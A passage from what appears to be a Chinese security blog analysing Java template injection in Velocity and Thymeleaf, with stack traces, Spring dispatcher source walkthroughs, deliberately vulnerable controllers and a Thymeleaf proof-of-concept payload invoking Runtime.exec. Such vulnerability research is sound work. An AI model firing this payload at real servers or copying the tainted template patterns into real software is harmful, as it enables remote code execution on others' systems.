class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1040</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">943</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doPost:<span class="number">909</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">652</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">733</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">231</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">202</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">542</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">143</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">374</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">868</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1590</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>接下来就是渲染工作了，回到RuntimeInstance类的evaluate方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913224208.png"><br>进入render方法中进行渲染，这里从context取值去做模板解析，输出到output writer当中<br>在ASTMethod类的execute方法中反射调用runtime<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230913230500.png"><br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">doInvoke:<span class="number">395</span>, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)</span><br><span class="line">invoke:<span class="number">384</span>, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)</span><br><span class="line">execute:<span class="number">173</span>, ASTMethod (org.apache.velocity.runtime.parser.node)</span><br><span class="line">execute:<span class="number">280</span>, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:<span class="number">369</span>, ASTReference (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:<span class="number">342</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br><span class="line">render:<span class="number">1378</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">1314</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">1265</span>, RuntimeInstance (org.apache.velocity.runtime)</span><br><span class="line">evaluate:<span class="number">180</span>, Velocity (org.apache.velocity.app)</span><br><span class="line">velocity1:<span class="number">26</span>, VelocityController (com.example.javasecssti)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">doInvoke:<span class="number">190</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeForRequest:<span class="number">138</span>, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeAndHandle:<span class="number">105</span>, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">invokeHandlerMethod:<span class="number">878</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">792</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1040</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">943</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doPost:<span class="number">909</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">652</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">733</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">231</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">119</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">193</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">166</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">202</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">542</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">143</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">374</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">868</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1590</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>另一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/ssti/velocity2&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;nth347&quot;)</span> String username)</span> <span class="keyword">throws</span> IOException, ParseException, org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;/path/to/template.vm&quot;</span>)));</span><br><span class="line">    templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">    ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Nguyen Nguyen Nguyen&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;012345678&quot;</span>);</span><br><span class="line">    ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;nguyen@vietnam.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">    org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line"></span><br><span class="line">    <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">    <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line"></span><br><span class="line">    template.setRuntimeServices(runtimeServices);</span><br><span class="line">    template.setData(node);</span><br><span class="line">    template.initDocument();</span><br><span class="line"></span><br><span class="line">    template.merge(ctx, out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out.toString();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模板文件template.vm内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is &lt;USERNAME&gt;.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>

<p>这段代码的主要作用是读取Velocity模板文件，替换模板中的占位符，然后使用给定的上下文对象进行模板渲染，并将渲染结果作为字符串返回<br>过程：</p>
<ul>
<li>使用templateString.replace对模板文件里的内容进行替换，这里的替换值可控</li>
<li>runtimeServices.parse将模板内容进行解析</li>
<li>template.merge(ctx, out);将模板内容进行渲染，这里会调用SimpleNode#render，过程大致和上面一致</li>
</ul>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/CoLo/p/16717761.html">Java安全之Velocity模版注入 - Zh1z3ven - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/8135">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a><br><a href="https://www.cnblogs.com/nice0e3/p/16218857.html">Java安全之velocity 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://anemone.top/vulnresearch-Solr_Velocity_injection/">Solr Velocity模板注入漏洞分析 | Anemone’s Blog</a><br><a href="https://paper.seebug.org/1107/">Apache Solr Velocity 模板注入漏洞深度分析 (seebug.org)</a></p>
<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>官方文档：<br>Thymeleaf is a modern server-side Java template engine for both web and standalone environments, capable of processing HTML, XML, JavaScript, CSS and even plain text.<br>The main goal of Thymeleaf is to provide an elegant and highly-maintainable way of creating templates. To achieve this, it builds on the concept of Natural Templates to inject its logic into template files in a way that doesn’t affect the template from being used as a design prototype. This improves communication of design and bridges the gap between design and development teams.<br>简单总结：Thymeleaf是适用于Web和独立环境的现代服务器端Java模板引擎，允许处理HTML、XML、TEXT、JAVASCRIPT、CSS、RAW。<br>参考：<br><a href="https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#what-is-thymeleaf">https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#what-is-thymeleaf</a><br><a href="https://www.docs4dev.com/docs/zh/thymeleaf/3.0/reference/using_thymeleaf.html#what-is-thymeleaf">https://www.docs4dev.com/docs/zh/thymeleaf/3.0/reference/using_thymeleaf.html#what-is-thymeleaf</a></p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p><strong>模板引擎</strong>：<br>模板引擎对象是org.thymeleaf.ITemplateEngine接口的实现<br>Thymeleaf核心是org.thymeleaf.TemplateEngine</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">templateEngine = <span class="keyword">new</span> <span class="title class_">TemplateEngine</span>();</span><br><span class="line">templateEngine.setTemplateResolver(templateResolver);</span><br></pre></td></tr></table></figure>

<p><strong>片段表达式</strong>：</p>
<ul>
<li>变量表达式：${…}</li>
<li>选择变量表达式：*{…}</li>
<li>消息表达：#{…}</li>
<li>URL表达式：@{…}</li>
<li>片段表达式：~{…}</li>
</ul>
<p>语法：<br><code>~&#123;templatename::selector&#125;</code>表示在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模板中定义的<code>selector</code><br><code>~&#123;templatename&#125;</code>表示引用整个<code>templatename</code>模版文件作为<code>fragment</code><br><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>，引用来自同一模版文件名为selector的fragmnt<br><strong>预处理</strong>：<br><code>__$&#123;expression&#125;__</code><br>预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式</p>
<h2 id="简单例子-2"><a href="#简单例子-2" class="headerlink" title="简单例子"></a>简单例子</h2><p>使用仓库<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a><br>注意thymeleaf的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>观察下面控制函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正确的payload：<br><code>/path?lang=en</code><br>POC:<br><code>/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</code></p>
<p>分析：</p>
<h2 id="SpringBoot请求解析"><a href="#SpringBoot请求解析" class="headerlink" title="SpringBoot请求解析"></a>SpringBoot请求解析</h2><h3 id="请求路由"><a href="#请求路由" class="headerlink" title="请求路由"></a>请求路由</h3><p>分析DispatcherServlet.class的doDispatch函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">processedRequest</span> <span class="operator">=</span> request;</span><br><span class="line">    <span class="type">HandlerExecutionChain</span> <span class="variable">mappedHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">multipartRequestParsed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 获取用于处理异步请求的WebAsyncManager对象</span></span><br><span class="line">    <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 视图</span></span><br><span class="line">            <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 异常</span></span><br><span class="line">            <span class="type">Exception</span> <span class="variable">dispatchException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 检查是否是多部分请求，并对请求进行处理</span></span><br><span class="line">                processedRequest = <span class="built_in">this</span>.checkMultipart(request);</span><br><span class="line">                <span class="comment">// 如果经过处理的请求对象与原始请求对象不同，说明请求是多部分请求，将multipartRequestParsed标志设置为true</span></span><br><span class="line">                multipartRequestParsed = processedRequest != request;</span><br><span class="line">                <span class="comment">// 获取处理器的执行链</span></span><br><span class="line">                mappedHandler = <span class="built_in">this</span>.getHandler(processedRequest);</span><br><span class="line">                <span class="comment">// 如果没有找到合适的处理器，调用noHandlerFound方法进行处理，并直接返回</span></span><br><span class="line">                <span class="keyword">if</span> (mappedHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.noHandlerFound(processedRequest, response);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 获取与处理器关联的处理器适配器</span></span><br><span class="line">                <span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> <span class="built_in">this</span>.getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line">                <span class="comment">// 获取请求方法</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isGet</span> <span class="operator">=</span> <span class="string">&quot;GET&quot;</span>.equals(method);</span><br><span class="line">                <span class="keyword">if</span> (isGet || <span class="string">&quot;HEAD&quot;</span>.equals(method)) &#123;</span><br><span class="line">                    <span class="comment">// 获取最近修改情况</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 预处理，执行拦截器</span></span><br><span class="line">                <span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 调用处理器适配器的handle方法，处理请求并返回ModelAndView对象</span></span><br><span class="line">                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line">                <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 根据请求和ModelAndView对象设置默认视图名称</span></span><br><span class="line">                <span class="built_in">this</span>.applyDefaultViewName(processedRequest, mv);</span><br><span class="line">                <span class="comment">// 调用处理器的执行链的applyPostHandle方法执行后置处理</span></span><br><span class="line">                mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">                dispatchException = var20;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var21) &#123;</span><br><span class="line">                dispatchException = <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler dispatch failed&quot;</span>, var21);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">            <span class="built_in">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var23) &#123;</span><br><span class="line">            <span class="built_in">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Handler processing failed&quot;</span>, var23));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mappedHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.cleanupMultipart(processedRequest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入getHandler方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建一个迭代器，用于遍历处理器映射列表</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMappings.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var2.hasNext()) &#123;</span><br><span class="line">            <span class="type">HandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> (HandlerMapping)var2.next();</span><br><span class="line">            <span class="comment">// 调用处理器映射的getHandler方法，传递请求对象，获取处理器的执行链</span></span><br><span class="line">            <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">            <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入org\springframework\web\servlet\handler\AbstractHandlerMapping.class中getHandler方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="comment">// 根据请求获取handler</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 获取处理器对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="built_in">this</span>.getHandlerInternal(request);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取默认处理器对象</span></span><br><span class="line">        handler = <span class="built_in">this</span>.getDefaultHandler();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果处理器对象是字符串类型，说明它是处理器的名称，将其转换为实际的处理器对象</span></span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String)handler;</span><br><span class="line">            handler = <span class="built_in">this</span>.obtainApplicationContext().getBean(handlerName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将处理器对象和请求对象作为参数，获取处理器的执行链</span></span><br><span class="line">        <span class="type">HandlerExecutionChain</span> <span class="variable">executionChain</span> <span class="operator">=</span> <span class="built_in">this</span>.getHandlerExecutionChain(handler, request);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Mapped to &quot;</span> + handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isDebugEnabled() &amp;&amp; !request.getDispatcherType().equals(DispatcherType.ASYNC)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.debug(<span class="string">&quot;Mapped to &quot;</span> + executionChain.getHandler());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果处理器具有CORS配置源或者请求是预检请求</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) &#123;</span><br><span class="line">            <span class="comment">// 获取CORS配置</span></span><br><span class="line">            <span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="built_in">this</span>.corsConfigurationSource != <span class="literal">null</span> ? <span class="built_in">this</span>.corsConfigurationSource.getCorsConfiguration(request) : <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 获取处理器的CORS配置</span></span><br><span class="line">            <span class="type">CorsConfiguration</span> <span class="variable">handlerConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.getCorsConfiguration(handler, request);</span><br><span class="line">            <span class="comment">// 合并全局CORS配置和处理器的CORS配置</span></span><br><span class="line">            config = config != <span class="literal">null</span> 